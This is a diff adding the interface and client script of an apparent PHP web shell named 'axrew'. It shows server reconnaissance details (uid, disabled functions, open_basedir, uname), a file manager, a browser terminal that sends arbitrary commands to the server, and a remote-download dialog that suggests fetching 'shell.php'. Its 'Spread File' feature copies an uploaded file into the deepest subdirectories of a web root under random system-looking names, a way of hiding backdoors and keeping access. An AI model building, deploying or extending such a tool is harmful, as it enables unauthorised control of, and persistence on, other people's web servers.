+.sl-fail{color:var(--r);font-size:10px;}
+.sl-err{color:var(--d2);font-size:9px;opacity:.6;}
+.spread-prog{height:2px;background:var(--bd);border-radius:1px;margin-bottom:8px;overflow:hidden;display:none;}
+.spread-prog-bar{height:100%;background:var(--a);width:0%;transition:width .3s ease;border-radius:1px;}
+.spread-stat{font-size:10px;color:var(--d2);margin-bottom:6px;min-height:14px;display:none;}
+.spread-stat b{color:var(--a);}
+.spread-stat.err b{color:var(--r);}
+/* COUNT */
+.count-row{display:flex;align-items:center;gap:8px;margin-bottom:8px;}
+.count-row label{color:var(--d2);font-size:10px;white-space:nowrap;flex-shrink:0;}
+.count-input{width:64px;padding:6px 8px;background:var(--s3);border:1px solid var(--bd2);color:var(--p);border-radius:4px;font-family:var(--f);font-size:11px;outline:none;transition:border-color .1s;text-align:center;-moz-appearance:textfield;}
+.count-input::-webkit-outer-spin-button,.count-input::-webkit-inner-spin-button{-webkit-appearance:none;margin:0;}
+.count-input:focus{border-color:var(--a);}
+.count-hint{color:var(--d);font-size:9.5px;flex:1;}
+.count-slider{flex:1;-webkit-appearance:none;appearance:none;height:3px;background:var(--bd2);border-radius:2px;outline:none;cursor:pointer;}
+.count-slider::-webkit-slider-thumb{-webkit-appearance:none;appearance:none;width:13px;height:13px;border-radius:50%;background:var(--a);cursor:pointer;border:2px solid var(--s1);transition:background .1s;}
+.count-slider::-moz-range-thumb{width:13px;height:13px;border-radius:50%;background:var(--a);cursor:pointer;border:2px solid var(--s1);}
+/* NOTIFY */
+#nw{position:fixed;bottom:12px;left:12px;z-index:9999;display:flex;flex-direction:column;gap:4px;pointer-events:none;}
+.nt{display:flex;align-items:center;gap:6px;padding:7px 12px;border-radius:4px;font-size:10px;font-weight:600;border-left:2px solid;box-shadow:0 2px 18px rgba(0,0,0,.7);transform:translateX(-120%);opacity:0;transition:transform .16s ease,opacity .16s ease;max-width:240px;}
+.nt.in{transform:translateX(0);opacity:1;}
+.nt.ok{background:rgba(8,8,18,.97);border-color:var(--a);color:var(--a);}
+.nt.err{background:rgba(16,4,4,.97);border-color:var(--r);color:var(--r);}
+/* LOGOUT btn */
+.logout-btn{
+  margin-left:auto;display:flex;align-items:center;gap:5px;
+  padding:0 12px;height:100%;
+  border-left:1px solid var(--bd);
+  color:var(--d2);font-size:9px;letter-spacing:.4px;text-transform:uppercase;
+  cursor:pointer;background:transparent;border-top:none;border-right:none;border-bottom:none;
+  font-family:var(--f);font-weight:600;transition:color .1s;text-decoration:none;
+  flex-shrink:0;
+}
+.logout-btn:hover{color:var(--r);}
+@media(max-width:900px){.sb{width:230px;}.ft th.tm,.ft td.tm{display:none;}}
+@media(max-width:650px){.sb{display:none;}.ft th.tp,.ft td.tp{display:none;}}
+</style>
+</head>
+<body>
+<div class="shell">
+
+<!-- HEADER -->
+<div class="hdr">
+  <div class="hdr-top">
+    <div class="logo">axrew</div>
+    <div class="hdr-chips">
+      <div class="hc"><span class="hc-k">user</span><span class="hc-v acc"><?=htmlspecialchars($SI['user'])?><?php if($SI['uid']!==''):?> <span style="opacity:.5">uid:<?=$SI['uid']?></span><?php endif;?></span></div>
+      <div class="hc"><span class="hc-k">host</span><span class="hc-v"><?=htmlspecialchars($SI['hostname'])?></span></div>
+      <div class="hc"><span class="hc-k">ip</span><span class="hc-v"><?=htmlspecialchars($SI['ip'])?><span style="opacity:.4"> :<?=htmlspecialchars($SI['port'])?></span></span></div>
+      <div class="hc"><span class="hc-k">os</span><span class="hc-v"><?=PHP_OS?></span></div>
+      <div class="hc"><span class="hc-k">php</span><span class="hc-v acc"><?=phpversion()?></span></div>
+    </div>
+    <a href="?__logout=1" class="logout-btn" title="Logout"><i class="fas fa-sign-out-alt"></i> logout</a>
+  </div>
+  <div class="hdr-si">
+    <div class="hsi"><span class="hsi-k">server</span><span class="hsi-v plain"><?=htmlspecialchars($SI['server'])?></span></div>
+    <div class="hsi"><span class="hsi-k">docroot</span><span class="hsi-v plain"><?=htmlspecialchars($SI['docroot'])?></span></div>
+    <div class="hsi"><span class="hsi-k">script</span><span class="hsi-v plain"><?=htmlspecialchars($SI['script'])?></span></div>
+    <div class="hsi"><span class="hsi-k">disk free</span><span class="hsi-v <?=$SI['disk_free']=='N/A'?'warn':'ok'?>"><?=htmlspecialchars($SI['disk_free'])?></span><span class="hsi-k" style="margin-left:3px">/ <?=htmlspecialchars($SI['disk_total'])?></span></div>
+    <div class="hsi"><span class="hsi-k">max upload</span><span class="hsi-v plain"><?=htmlspecialchars($SI['max_upload'])?></span></div>
+    <div class="hsi"><span class="hsi-k">max exec</span><span class="hsi-v plain"><?=htmlspecialchars($SI['max_exec'])?></span></div>
+    <div class="hsi"><span class="hsi-k">safe mode</span><span class="hsi-v <?=$SI['safe_mode']=='On'?'warn':'ok'?>"><?=$SI['safe_mode']?></span></div>
+    <div class="hsi"><span class="hsi-k">open_basedir</span><span class="hsi-v <?=$SI['open_bd']!='none'?'warn':'ok'?>"><?=htmlspecialchars($SI['open_bd'])?></span></div>
+    <div class="hsi"><span class="hsi-k">disable_fn</span><span class="hsi-v <?=$SI['disable_fn']!='none'?'warn':'ok'?>"><?=htmlspecialchars($SI['disable_fn'])?></span></div>
+    <div class="hsi"><span class="hsi-k">uname</span><span class="hsi-v plain"><?=htmlspecialchars($SI['uname'])?></span></div>
+  </div>
+</div>
+
+<div class="body">
+  <div class="fp">
+    <div class="pbar">
+      <div class="navg">
+        <button class="nb" id="btnB" disabled onclick="navBack()" title="Back"><i class="fas fa-chevron-left"></i></button>
+        <button class="nb" id="btnF" disabled onclick="navFwd()"  title="Forward"><i class="fas fa-chevron-right"></i></button>
+        <button class="nb" onclick="navHome()" title="Shell home"><i class="fas fa-home"></i></button>
+      </div>
+      <div class="sep"></div>
+      <div class="pnav" id="pnav"></div>
+      <div class="pbar-right">
+        <button class="pb" onclick="loadFiles()" title="Refresh"><i class="fas fa-sync-alt"></i></button>
+        <button class="pb" id="selBtn" onclick="toggleSel()" title="Select mode"><i class="fas fa-check-square"></i></button>
+      </div>
+    </div>
+    <div class="bbar" id="bbar">
+      <button class="bsm" onclick="selAll()">All</button>
+      <button class="bsm" onclick="selNone()">None</button>
+      <span class="bbar-cnt">sel: <b id="selCnt">0</b></span>
+      <button class="bcopy" id="bcopyBtn" onclick="doBulkCopy()"><i class="fas fa-copy"></i> Copy</button>
+      <button class="bpaste" id="bpasteBtn" onclick="doBulkPaste()"><i class="fas fa-paste"></i> Paste here</button>
+      <button class="bdel" id="bdelBtn" onclick="doBulkDel()"><i class="fas fa-trash"></i> Delete</button>
+    </div>
+    <div class="ftw">
+      <table class="ft">
+        <thead>
+          <tr>
+            <th class="tc" id="thc" style="display:none;"></th>
+            <th class="tn">Name</th><th class="ts">Size</th><th class="tp">Perms</th>
+            <th class="tm">Modified</th><th class="ta">Actions</th>
+          </tr>
+        </thead>
+        <tbody id="fl">
+          <tr class="load-r"><td colspan="5"><i class="fas fa-circle-notch fa-spin"></i> Loading...</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <div class="sb">
+    <div class="qa">
+      <button class="qa-btn" onclick="openM('upload')"><i class="fas fa-upload"></i> Upload</button>
+      <button class="qa-btn" onclick="openM('remote')"><i class="fas fa-cloud-download-alt"></i> Remote</button>
+      <button class="qa-btn" onclick="openM('newfile')"><i class="fas fa-file"></i> New File</button>
+      <button class="qa-btn" onclick="openM('newdir')"><i class="fas fa-folder-plus"></i> New Dir</button>
+      <button class="qa-btn qa-spread" onclick="openM('spread')"><i class="fas fa-broadcast-tower"></i> Spread File</button>
+    </div>
+    <div class="term">
+      <div class="thdr">
+        <div class="tdots"><div class="tdot r"></div><div class="tdot y"></div><div class="tdot g"></div></div>
+        <span class="tlbl">terminal</span>
+      </div>
+      <div class="tbody">
+        <div class="tout" id="tout"></div>
+        <div class="tinw">
+          <span class="tps">$</span>
+          <input type="text" class="tinp" id="tinp" placeholder="command..." autocomplete="off" spellcheck="false">
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</div>
+<div id="nw"></div>
+
+<!-- UPLOAD -->
+<div class="ov" id="m-upload">
+  <div class="mbox">
+    <div class="mhd"><div class="mttl"><i class="fas fa-upload"></i> Upload File</div><button class="mx" onclick="closeM('upload')">&times;</button></div>
+    <div class="mbody">
+      <form id="uploadForm" enctype="multipart/form-data">
+        <input type="file" name="file" class="mi" style="color:var(--d2)">
+        <button type="submit" class="btn bg bfw"><i class="fas fa-upload"></i> Upload</button>
+      </form>
+    </div>
+  </div>
+</div>
+<!-- REMOTE -->
+<div class="ov" id="m-remote">
+  <div class="mbox">
+    <div class="mhd"><div class="mttl"><i class="fas fa-cloud-download-alt"></i> Remote Download</div><button class="mx" onclick="closeM('remote')">&times;</button></div>
+    <div class="mbody">
+      <input type="text" id="r-url" class="mi" placeholder="https://example.com/shell.php">
+      <input type="text" id="r-fn"  class="mi" placeholder="Save as filename">
+    </div>
+    <div class="mfoot">
+      <button class="btn br" onclick="closeM('remote')">Cancel</button>
+      <button class="btn bg" onclick="doRemote()"><i class="fas fa-download"></i> Download</button>
+    </div>
+  </div>
+</div>
+<!-- NEW FILE -->
+<div class="ov" id="m-newfile">
+  <div class="mbox">
+    <div class="mhd"><div class="mttl"><i class="fas fa-file"></i> New File</div><button class="mx" onclick="closeM('newfile')">&times;</button></div>
+    <div class="mbody"><input type="text" id="nf-name" class="mi" placeholder="filename.php"></div>
+    <div class="mfoot">
+      <button class="btn br" onclick="closeM('newfile')">Cancel</button>
+      <button class="btn bg" onclick="doNewfile()"><i class="fas fa-plus"></i> Create</button>
+    </div>
+  </div>
+</div>
+<!-- NEW DIR -->
+<div class="ov" id="m-newdir">
+  <div class="mbox">
+    <div class="mhd"><div class="mttl"><i class="fas fa-folder-plus"></i> New Directory</div><button class="mx" onclick="closeM('newdir')">&times;</button></div>
+    <div class="mbody"><input type="text" id="nd-name" class="mi" placeholder="directory_name"></div>
+    <div class="mfoot">
+      <button class="btn br" onclick="closeM('newdir')">Cancel</button>
+      <button class="btn bg" onclick="doNewdir()"><i class="fas fa-plus"></i> Create</button>
+    </div>
+  </div>
+</div>
+<!-- EDIT -->
+<div class="ov" id="m-edit">
+  <div class="mbox w">
+    <div class="mhd"><div class="mttl" id="editT"><i class="fas fa-edit"></i> Edit</div><button class="mx" onclick="closeM('edit')">&times;</button></div>
+    <div class="mbody"><textarea id="editC" class="mta" spellcheck="false"></textarea></div>
+    <div class="mfoot">
+      <button class="btn br" onclick="closeM('edit')">Cancel</button>
+      <button class="btn bg" onclick="doSave()"><i class="fas fa-save"></i> Save</button>
+    </div>
+  </div>
+</div>
+<!-- CHMOD -->
+<div class="ov" id="m-chmod">
+  <div class="mbox">
+    <div class="mhd"><div class="mttl"><i class="fas fa-key"></i> Chmod</div><button class="mx" onclick="closeM('chmod')">&times;</button></div>
+    <div class="mbody"><input type="text" id="ch-perm" class="mi" placeholder="755" maxlength="4"></div>
+    <div class="mfoot">
+      <button class="btn br" onclick="closeM('chmod')">Cancel</button>
+      <button class="btn bg" onclick="doChmod()"><i class="fas fa-check"></i> Apply</button>
+    </div>
+  </div>
+</div>
+<!-- RENAME -->
+<div class="ov" id="m-rename">
+  <div class="mbox">
+    <div class="mhd"><div class="mttl"><i class="fas fa-pencil-alt"></i> Rename</div><button class="mx" onclick="closeM('rename')">&times;</button></div>
+    <div class="mbody"><input type="text" id="rn-name" class="mi" placeholder="new name"></div>
+    <div class="mfoot">
+      <button class="btn br" onclick="closeM('rename')">Cancel</button>
+      <button class="btn bg" onclick="doRename()"><i class="fas fa-check"></i> Rename</button>
+    </div>
+  </div>
+</div>
+<!-- CONFIRM -->
+<div class="ov" id="m-confirm">
+  <div class="mbox">
+    <div class="mhd"><div class="mttl"><i class="fas fa-exclamation-triangle"></i> Confirm</div><button class="mx" onclick="closeM('confirm')">&times;</button></div>
+    <div class="mbody"><p class="cmsg" id="c-msg"></p></div>
+    <div class="mfoot">
+      <button class="btn br" onclick="closeM('confirm')">Cancel</button>
+      <button class="btn bg" onclick="runConfirm()"><i class="fas fa-check"></i> Confirm</button>
+    </div>
+  </div>
+</div>
+<!-- SPREAD -->
+<div class="ov" id="m-spread">
+  <div class="mbox sp">
+    <div class="mhd">
+      <div class="mttl"><i class="fas fa-broadcast-tower"></i> Spread File</div>
+      <button class="mx" onclick="closeSpread()">&times;</button>
+    </div>
+    <div class="mbody">
+      <div class="spread-info">
+        Spread a file into the deepest subdirectories across all branches of a target path.<br>
+        Each copy gets a random system-blend filename. Set any absolute path as root — not limited to current dir.
+      </div>
+      <form id="spreadForm" enctype="multipart/form-data">
+        <div style="display:flex;gap:5px;margin-bottom:8px;align-items:center;">
+          <input type="text" id="sp-root" class="mi" style="margin-bottom:0;flex:1;" placeholder="/home/user/public_html">
+          <button type="button" class="btn bg" style="flex-shrink:0;padding:5px 9px;font-size:10px;" onclick="spUseCWD()"><i class="fas fa-crosshairs"></i> CWD</button>
+          <button type="button" class="btn bg" style="flex-shrink:0;padding:5px 9px;font-size:10px;" onclick="spUseDocRoot()"><i class="fas fa-globe"></i> DOCROOT</button>
+        </div>
+        <div id="spRootHint" style="font-size:9.5px;color:var(--d2);margin-bottom:8px;padding:0 2px;min-height:13px;"></div>
+        <div class="count-row">
+          <label><i class="fas fa-layer-group" style="margin-right:4px;opacity:.6"></i>Jumlah file:</label>
+          <input type="number" id="sp-count" class="count-input" value="5" min="1" max="50">
+          <input type="range"  id="sp-slider" class="count-slider" value="5" min="1" max="50">
+          <span class="count-hint" id="sp-count-hint">5 file — max 50</span>
+        </div>
+        <input type="file" name="file" id="sp-file" class="mi" style="color:var(--d2)">
+        <div class="spread-prog" id="spProg"><div class="spread-prog-bar" id="spBar"></div></div>
+        <div class="spread-stat" id="spStat"></div>
+        <button type="submit" class="btn bg bfw" id="spBtn"><i class="fas fa-broadcast-tower"></i> Spread Now</button>
+      </form>
+      <div class="spread-log" id="spLog" style="display:none;">
+        <div class="spread-log-hdr">Spread Results &nbsp;<span id="spLogCount"></span></div>
+        <div id="spLogItems"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+<script>
+const SELF = '<?= $SELF_JS ?>';
+const HOME = '<?= $HOME_JS ?>';
+let CWD = '<?= $INIT_PATH ?>';
+let SF = '', CCB = null, SEL = false;
+let HB = [], HF = [], CLIPBOARD = [];
+
+function post(data, cb, fail) {
+  $.ajax({ url: SELF, method: 'POST', data: data, dataType: 'json',
+    success: cb, error: function(x) { if(fail) fail(); else notify('Network error','err'); }
+  });
+}
+function postForm(fd, cb) {
+  $.ajax({ url: SELF, method: 'POST', data: fd, processData: false, contentType: false, dataType: 'json',
+    success: cb, error: function(){ notify('Network error','err'); }
+  });
+}
+function notify(msg, type) {
+  type = type || 'ok';
+  var ic = type === 'ok' ? 'fa-check-circle' : 'fa-times-circle';
+  var el = $('<div class="nt '+type+'"><i class="fas '+ic+'"></i>'+msg+'</div>');
+  $('#nw').append(el);
+  setTimeout(function(){ el.addClass('in'); }, 10);
+  setTimeout(function(){ el.removeClass('in'); setTimeout(function(){ el.remove(); }, 250); }, 2600);
+}
+function openM(id) {
+  $('#m-'+id).addClass('on');
+  setTimeout(function(){ $('#m-'+id).find('input:not([type=file]):not([type=number]):not([type=range]),textarea').first().focus(); }, 80);
+}
+function closeM(id) { $('#m-'+id).removeClass('on'); }
+$(document).on('click', '.ov', function(e){ if(e.target===this) closeM($(this).attr('id').replace('m-','')); });
+$(document).on('keydown', function(e){
+  if(e.key==='Escape') $('.ov.on').each(function(){ closeM($(this).attr('id').replace('m-','')); });
+});
+$(document).on('keydown','#nf-name', function(e){ if(e.key==='Enter') doNewfile(); });
+$(document).on('keydown','#nd-name', function(e){ if(e.key==='Enter') doNewdir(); });
+$(document).on('keydown','#r-url,#r-fn', function(e){ if(e.key==='Enter') doRemote(); });
+$(document).on('keydown','#ch-perm', function(e){ if(e.key==='Enter') doChmod(); });
+$(document).on('keydown','#rn-name', function(e){ if(e.key==='Enter') doRename(); });
+$(document).on('keydown','#m-confirm', function(e){ if(e.key==='Enter') runConfirm(); });
+function confirm2(msg, cb) { CCB=cb; $('#c-msg').text(msg); openM('confirm'); }
+function runConfirm() { closeM('confirm'); if(CCB){ CCB(); CCB=null; } }
+function he(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+function buildNav(path) {
+  var parts = path.replace(/\\/g,'/').split('/').filter(function(p){ return p; });
+  var html = '<span class="pseg" data-p="/">/</span>';
+  var cum = '';
+  parts.forEach(function(p){ cum += '/'+p; html += '<span class="psep">/</span><span class="pseg" data-p="'+he(cum)+'">'+he(p)+'</span>'; });
+  $('#pnav').html(html);
+}
+$(document).on('click','.pseg',function(){ navTo($(this).data('p')); });
+function navTo(path) {
+  if(path !== CWD){ HB.push(CWD); HF=[]; }
+  updNB();
+  post({ action:'chdir', path:path }, function(r){
+    if(r.ok){ CWD=r.path; buildNav(CWD); loadFiles(); }
+    else notify('Cannot access directory','err');
+    updNB();
+  });
+}
+function navBack() {
+  if(!HB.length) return;
+  HF.push(CWD); var p=HB.pop(); updNB();
+  post({ action:'chdir', path:p }, function(r){ if(r.ok){ CWD=r.path; buildNav(CWD); loadFiles(); } updNB(); });
+}
+function navFwd() {
+  if(!HF.length) return;
+  HB.push(CWD); var p=HF.pop(); updNB();
+  post({ action:'chdir', path:p }, function(r){ if(r.ok){ CWD=r.path; buildNav(CWD); loadFiles(); } updNB(); });
+}
+function navHome() { navTo(HOME); }
+function updNB() {
+  var bb=document.getElementById('btnB'), bf=document.getElementById('btnF');
+  HB.length ? bb.removeAttribute('disabled') : bb.setAttribute('disabled','');
+  HF.length ? bf.removeAttribute('disabled') : bf.setAttribute('disabled','');
+}
+function ficon(n) {
+  var e=n.split('.').pop().toLowerCase();
+  var m={php:'fa-code',html:'fa-code',htm:'fa-code',js:'fa-file-code',ts:'fa-file-code',css:'fa-file-code',json:'fa-file-code',xml:'fa-file-code',yml:'fa-file-code',yaml:'fa-file-code',txt:'fa-file-alt',log:'fa-file-alt',md:'fa-file-alt',ini:'fa-file-alt',cfg:'fa-file-alt',conf:'fa-file-alt',env:'fa-file-alt',jpg:'fa-file-image',jpeg:'fa-file-image',png:'fa-file-image',gif:'fa-file-image',svg:'fa-file-image',webp:'fa-file-image',zip:'fa-file-archive',rar:'fa-file-archive',gz:'fa-file-archive','7z':'fa-file-archive',tar:'fa-file-archive',sh:'fa-terminal',bash:'fa-terminal',py:'fa-file-code',rb:'fa-file-code',pl:'fa-file-code',sql:'fa-database',pdf:'fa-file-pdf',doc:'fa-file-word',docx:'fa-file-word',xls:'fa-file-excel',xlsx:'fa-file-excel',mp4:'fa-file-video',mkv:'fa-file-video',avi:'fa-file-video',mp3:'fa-file-audio',wav:'fa-file-audio'};
+  return '<i class="fas '+(m[e]||'fa-file')+'"></i>';
+}
+function loadFiles() {
+  var cols = SEL ? 6 : 5;
+  $('#fl').html('<tr class="load-r"><td colspan="'+cols+'"><i class="fas fa-circle-notch fa-spin"></i> Loading...</td></tr>');
+  post({ action:'ls' }, function(r) {
+    if(!r||!r.ok){ $('#fl').html('<tr class="load-r"><td colspan="'+cols+'"><i class="fas fa-lock"></i> '+(r&&r.err?he(r.err):'Error')+'</td></tr>'); return; }
+    CWD = r.path; buildNav(CWD);
+    var files = r.files||[];
+    if(!files.length){ $('#fl').html('<tr class="load-r"><td colspan="'+cols+'"><i class="fas fa-inbox"></i> Empty directory</td></tr>'); return; }
+    files.sort(function(a,b){ if(a.isdir&&!b.isdir) return -1; if(!a.isdir&&b.isdir) return 1; return a.name.localeCompare(b.name); });
+    var html = '';
+    for(var i=0; i<files.length; i++){
+      var f=files[i], fp=CWD+'/'+f.name;
+      var cls = f.isdir ? 'dir' : 'file';
+      var noRead = (!f.r) ? ' no-read' : '';
+      var ico = f.isdir ? '<i class="fas fa-folder"></i>' : ficon(f.name);
+      var sz  = f.isdir ? '<span style="color:var(--d2);font-size:10px;letter-spacing:.5px">DIR</span>' : he(f.size);
+      var chkTd = SEL ? '<td class="tc"><input type="checkbox" class="fchk"></td>' : '';
+      html += '<tr class="fr '+cls+noRead+'" data-fp="'+he(fp)+'" data-isdir="'+(f.isdir?1:0)+'" data-noread="'+(f.r?0:1)+'">';
+      html += chkTd;
+      html += '<td><div class="fn"><span class="fi">'+ico+'</span><span class="nm">'+he(f.name)+'</span></div></td>';
+      html += '<td class="ts">'+sz+'</td><td class="tp">'+he(f.perm)+'</td><td class="tm">'+he(f.time)+'</td>';
+      html += '<td class="ta"><div class="fag">';
+      if(!f.isdir) html += '<button class="fab fe" data-act="edit" title="Edit"><i class="fas fa-edit"></i></button>';
+      html += '<button class="fab fd" data-act="dl" title="Download"><i class="fas fa-download"></i></button>';
+      html += '<button class="fab fc" data-act="chmod" title="Chmod"><i class="fas fa-key"></i></button>';
+      html += '<button class="fab fr2" data-act="rename" title="Rename"><i class="fas fa-pencil-alt"></i></button>';
+      html += '<button class="fab fx" data-act="del" title="Delete"><i class="fas fa-trash"></i></button>';
+      html += '</div></td></tr>';
+    }
+    $('#fl').html(html); updSelCnt();
+  }, function(){ $('#fl').html('<tr class="load-r"><td colspan="'+(SEL?6:5)+'"><i class="fas fa-exclamation-triangle"></i> Failed to load</td></tr>'); });
+}
+$(document).on('click', '.fr .fn', function(e) {
+  var row=$(this).closest('.fr'), fp=row.data('fp'), isdir=parseInt(row.data('isdir'),10);
+  if(SEL){ var chk=row.find('.fchk'); chk.prop('checked',!chk.prop('checked')); row.toggleClass('sel',chk.prop('checked')); updSelCnt(); return; }
+  if(isdir){ navTo(fp); } else { doEdit(fp); }
+});
+$(document).on('click','.fab',function(e){
+  e.stopPropagation();
+  var row=$(this).closest('.fr'), fp=row.data('fp'), isdir=parseInt(row.data('isdir'),10), act=$(this).data('act');
+  if(act==='edit') doEdit(fp);
+  else if(act==='dl') doDL(fp);
+  else if(act==='chmod') doChmodOpen(fp);
+  else if(act==='rename') doRenameOpen(fp);
+  else if(act==='del') doDel(fp,isdir);
+});
+$(document).on('change','.fchk',function(){ $(this).closest('.fr').toggleClass('sel',$(this).prop('checked')); updSelCnt(); });
+function toggleSel(){ SEL=!SEL; $('#selBtn').toggleClass('sel-on',SEL); document.getElementById('thc').style.display=SEL?'':'none'; $('#bbar').toggleClass('on',SEL); loadFiles(); }
+function selAll()  { $('.fchk').prop('checked',true).each(function(){ $(this).closest('.fr').addClass('sel'); }); updSelCnt(); }
+function selNone() { $('.fchk').prop('checked',false).each(function(){ $(this).closest('.fr').removeClass('sel'); }); updSelCnt(); }
+function updSelCnt(){
+  var n=$('.fchk:checked').length; $('#selCnt').text(n);
+  if(n>0){ document.getElementById('bdelBtn').classList.add('on'); document.getElementById('bcopyBtn').classList.add('on'); }
+  else { document.getElementById('bdelBtn').classList.remove('on'); document.getElementById('bcopyBtn').classList.remove('on'); }
+  CLIPBOARD.length>0 ? document.getElementById('bpasteBtn').classList.add('on') : document.getElementById('bpasteBtn').classList.remove('on');
+}
+function doBulkDel(){
+  var fps=[]; $('.fchk:checked').each(function(){ fps.push($(this).closest('.fr').data('fp')); });
+  if(!fps.length) return;
+  confirm2('Delete '+fps.length+' item(s)? This cannot be undone.',function(){
+    post({ action:'rmbulk', files:JSON.stringify(fps) },function(r){
+      if(r){ r.failed>0 ? notify('Deleted '+r.deleted+', failed '+r.failed,'err') : notify('Deleted '+r.deleted+' item(s)'); }
+      loadFiles();
+    });
+  });
+}
+function doBulkCopy(){ var fps=[]; $('.fchk:checked').each(function(){ fps.push($(this).closest('.fr').data('fp')); }); if(!fps.length) return; CLIPBOARD=fps; notify(fps.length+' item(s) copied to clipboard'); updSelCnt(); }
+function doBulkPaste(){
+  if(!CLIPBOARD.length){ notify('Clipboard is empty','err'); return; }
+  notify('Pasting '+CLIPBOARD.length+' item(s)...');
+  post({ action:'copy', files:JSON.stringify(CLIPBOARD), dest:CWD },function(r){
+    if(r){ r.failed>0 ? notify('Pasted '+r.copied+', failed '+r.failed,'err') : notify('Pasted '+r.copied+' item(s)'); }
+    loadFiles();
+  });
+}
+function doEdit(fp){
+  SF=fp; $('#editT').html('<i class="fas fa-edit"></i> '+he(fp.split('/').pop())); $('#editC').val('Loading...'); openM('edit');
+  post({ action:'read', file:fp },function(r){
+    if(r&&r.ok&&r.content!==undefined){ try{ $('#editC').val(atob(r.content)); }catch(e){ $('#editC').val('(binary)'); } }
+    else{ notify('Cannot read file','err'); closeM('edit'); }
+  });
+}
+function doSave(){
+  post({ action:'write', file:SF, content:$('#editC').val() },function(r){
+    if(r&&r.ok){ closeM('edit'); notify('File saved'); loadFiles(); }
+    else notify('Save failed','err');
+  });
+}
+function doDL(fp){ window.location=SELF+'?dl='+btoa(fp); }
+function doChmodOpen(fp){ SF=fp; $('#ch-perm').val('755'); openM('chmod'); }
+function doChmod(){
+  post({ action:'chmod', file:SF, perm:$('#ch-perm').val() },function(r){
+    if(r&&r.ok){ closeM('chmod'); notify('Permissions updated'); loadFiles(); }
+    else notify('Chmod failed','err');
+  });
+}
+function doRenameOpen(fp){ SF=fp; $('#rn-name').val(fp.split('/').pop()); openM('rename'); }
+function doRename(){
+  var nn=$('#rn-name').val().trim();
+  if(!nn){ notify('Enter a name','err'); return; }
+  var dir=SF.substring(0,SF.lastIndexOf('/')+1);
+  post({ action:'rename', old:SF, new:dir+nn },function(r){
+    if(r&&r.ok){ closeM('rename'); notify('Renamed'); loadFiles(); }
+    else notify('Rename failed','err');
+  });
+}
+function doDel(fp,isdir){
+  var n=fp.split('/').pop();
+  confirm2('Delete '+(isdir?'directory':'file')+' "'+n+'"?',function(){
+    post({ action:'rrmdir', dir:fp },function(r){
+      if(r&&r.ok){ notify('Deleted'); loadFiles(); }
+      else notify('Delete failed','err');
+    });
+  });
+}
+$('#uploadForm').on('submit',function(e){
+  e.preventDefault(); var fd=new FormData(this); fd.append('action','upload');
+  postForm(fd,function(r){
+    if(r&&r.ok){ closeM('upload'); notify('File uploaded'); loadFiles(); document.getElementById('uploadForm').reset(); }
+    else notify('Upload failed','err');
+  });
+});
+function doRemote(){
+  var url=$('#r-url').val().trim(), fn=$('#r-fn').val().trim();
+  if(!url||!fn){ notify('Enter URL and filename','err'); return; }
+  notify('Downloading...');
+  post({ action:'remote', url:url, filename:fn },function(r){
+    if(r&&r.ok){ closeM('remote'); notify('Downloaded'); loadFiles(); $('#r-url,#r-fn').val(''); }
+    else notify(r&&r.msg?r.msg:'Download failed','err');
+  });
+}
+function doNewfile(){
+  var n=$('#nf-name').val().trim(); if(!n){ notify('Enter filename','err'); return; }
+  post({ action:'newfile', file:CWD+'/'+n },function(r){
+    if(r&&r.ok){ closeM('newfile'); notify('File created'); loadFiles(); $('#nf-name').val(''); }
+    else notify('Create failed','err');
+  });
+}
+function doNewdir(){
+  var n=$('#nd-name').val().trim(); if(!n){ notify('Enter name','err'); return; }
+  post({ action:'mkdir', dir:CWD+'/'+n },function(r){
+    if(r&&r.ok){ closeM('newdir'); notify('Directory created'); loadFiles(); $('#nd-name').val(''); }
+    else notify('Create failed','err');
+  });
+}
+$('#tinp').on('keydown',function(e){ if(e.key==='Enter') runCmd(); });
+function runCmd(){
+  var cmd=$('#tinp').val().trim(); if(!cmd) return;
+  var out=document.getElementById('tout');
+  if(cmd==='clear'||cmd==='cls'){ out.innerHTML=''; $('#tinp').val(''); return; }
+  out.innerHTML += '<div class="tline cmd">$ '+he(cmd)+'</div>';
+  post({ action:'cmd', cmd:cmd },function(r){
+    if(r&&r.output!==undefined){
+      var lines=r.output.split('\n');
+      for(var i=0;i<lines.length;i++) if(lines[i]) out.innerHTML+='<div class="tline out">'+lines[i]+'</div>';
+    }
+    out.scrollTop=out.scrollHeight;
+  });
+  $('#tinp').val('');
+}
+/* SPREAD */
+var DOCROOT_PHP = '<?= addslashes(isset($_SERVER["DOCUMENT_ROOT"]) ? rtrim($_SERVER["DOCUMENT_ROOT"],"/") : "") ?>';
+function syncCount(src){
+  var v=parseInt(src.value,10); if(isNaN(v)||v<1) v=1; if(v>50) v=50; src.value=v;
+  if(src.id==='sp-count') document.getElementById('sp-slider').value=v;
+  else document.getElementById('sp-count').value=v;
+  document.getElementById('sp-count-hint').innerHTML=(v===1?'1 file':v+' file')+' — max 50';
+}
+$(document).on('input','#sp-count',  function(){ syncCount(this); });
+$(document).on('input','#sp-slider', function(){ syncCount(this); });
+function spUseCWD(){ $('#sp-root').val(CWD); $('#spRootHint').html('<i class="fas fa-check-circle" style="color:var(--a);margin-right:3px"></i>Set to current working directory: <span style="color:var(--a)">'+he(CWD)+'</span>'); }
+function spUseDocRoot(){ var dr=DOCROOT_PHP||CWD; $('#sp-root').val(dr); $('#spRootHint').html('<i class="fas fa-check-circle" style="color:var(--a);margin-right:3px"></i>Set to document root: <span style="color:var(--a)">'+he(dr)+'</span>'); }
+function closeSpread(){
+  closeM('spread'); $('#spreadForm')[0].reset(); $('#sp-root').val(''); $('#sp-count').val(5); $('#sp-slider').val(5);
+  $('#sp-count-hint').html('5 file — max 50'); $('#spRootHint').html(''); $('#spLog').hide(); $('#spLogItems').html('');
+  $('#spLogCount').text(''); $('#spStat').hide().text(''); $('#spProg').hide(); $('#spBar').css('width','0%');
+  $('#spBtn').prop('disabled',false).html('<i class="fas fa-broadcast-tower"></i> Spread Now');
+}
+$(document).on('click', '.qa-spread', function(){
+  if(!$('#sp-root').val()){ $('#sp-root').val(CWD); $('#spRootHint').html('<i class="fas fa-info-circle" style="color:var(--d2);margin-right:3px"></i>Default: current dir. Change to any absolute path.'); }
+});
